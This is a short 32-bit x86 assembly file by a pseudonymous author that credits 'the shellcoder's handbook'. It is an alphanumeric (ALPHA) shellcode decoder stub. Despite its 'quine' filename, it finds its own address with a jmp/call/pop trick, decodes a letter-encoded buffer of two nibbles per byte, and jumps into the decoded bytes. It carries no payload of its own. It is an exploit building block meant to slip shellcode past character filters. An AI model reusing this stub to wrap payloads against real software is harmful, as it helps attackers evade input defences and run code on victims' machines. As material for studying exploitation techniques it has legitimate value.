	;; quine.asm by h4lf-jiffie (dohmatob elvis dopgima) a tiny ALPHA decoder
	;; 4CKNOWLEDGEMENTS:
	;; 	0]-- the shellcoder's handbook

[SECTION .text]

BITS 32

global _start

_start:
	jmp		B
	
A:
	jmp		get_PC
	
B:
	call		A
	
get_PC:	
	pop		esi
	sub		esi,0x12	; esi now points to encrypted size of the input buffer
	push		esi		; save
	mov		ecx,0x8
	push		esi
	pop		edi		; sets edi to esi
	call		decoder
	pop		esi		; restore: esi now points to decrypted size of input buffer
	mov		ecx,[esi]	; this sets ecx to the size of input buffer
	add		esi,ecx		; esi now points input buffer
	push		esi		; save
	push		esi
	pop		edi		; sets edi to esi
	call		decoder
	pop		esi		; restore: esi now points to decrypted input buffer
	jmp		esi
	
decoder:
	jecxz		decoder_end
	dec		ecx
	mov		al,	[edi]
	sub		al,0x41
	shl		al,4
	inc		edi
	add		al,[edi]
	sub		al,0x41
	mov		[esi],al
	inc		esi
	inc		edi
	jmp		decoder

decoder_end:
	ret
	
	
	
	
